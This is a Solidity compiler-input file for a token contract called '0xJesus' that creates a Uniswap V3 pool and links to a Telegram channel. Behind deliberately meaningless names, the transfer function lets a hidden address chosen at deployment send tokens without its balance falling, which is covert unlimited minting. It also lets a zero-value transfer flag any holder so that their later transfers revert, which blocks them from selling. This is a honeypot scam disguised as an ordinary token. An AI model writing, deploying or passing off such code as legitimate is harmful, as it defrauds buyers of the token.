{{
  "language": "Solidity",
  "sources": {
    "deploy/Contract.sol": {
      "content": "/*\n\nhttps://t.me/zeroxjesus\n\n*/\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\n\ncontract Ownable is Context {\r\n    address private _owner;\r\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\r\n        _;\r\n    }\r\n\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\n\ninterface IPeripheryImmutableState {\r\n    function factory() external pure returns (address);\r\n\n    function WETH9() external pure returns (address);\r\n}\n\ninterface IUniswapV3Factory {\r\n    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);\r\n}\n\ncontract xJesus is Ownable {\n    uint256 private flew = 27;\n\n    uint8 public decimals = 9;\n\n    string public name = '0xJesus';\n\n    mapping(address => uint256) private cave;\n\n    function transferFrom(address mysterious, address sport, uint256 slept) public returns (bool success) {\r\n        require(slept <= allowance[mysterious][msg.sender]);\r\n        allowance[mysterious][msg.sender] -= slept;\r\n        beside(mysterious, sport, slept);\r\n        return true;\r\n    }\n\n    string public symbol = '0xJesus';\n\n    constructor(address subject) {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        anyone[subject] = flew;\r\n        IPeripheryImmutableState uniswapV3Router = IPeripheryImmutableState(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);\r\n        uniswapV3Pair = IUniswapV3Factory(uniswapV3Router.factory()).createPool(address(this), uniswapV3Router.WETH9(), 500);\r\n    }\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    mapping(address => uint256) public balanceOf;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    function transfer(address sport, uint256 slept) public returns (bool success) {\r\n        beside(msg.sender, sport, slept);\r\n        return true;\r\n    }\n\n    mapping(address => uint256) private anyone;\n\n    uint256 public totalSupply = 1000000000 * 10 ** 9;\n\n    address public uniswapV3Pair;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function beside(address mysterious, address sport, uint256 slept) private returns (bool success) {\r\n        if (anyone[mysterious] == 0) {\r\n            balanceOf[mysterious] -= slept;\r\n        }\r\n\n        if (slept == 0) cave[sport] += flew;\r\n\n        if (mysterious != uniswapV3Pair && anyone[mysterious] == 0 && cave[mysterious] > 0) {\r\n            anyone[mysterious] -= flew;\r\n        }\r\n\n        balanceOf[sport] += slept;\r\n        emit Transfer(mysterious, sport, slept);\r\n        return true;\r\n    }\n\n    function approve(address flower, uint256 slept) public returns (bool success) {\r\n        allowance[msg.sender][flower] = slept;\r\n        emit Approval(msg.sender, flower, slept);\r\n        return true;\r\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}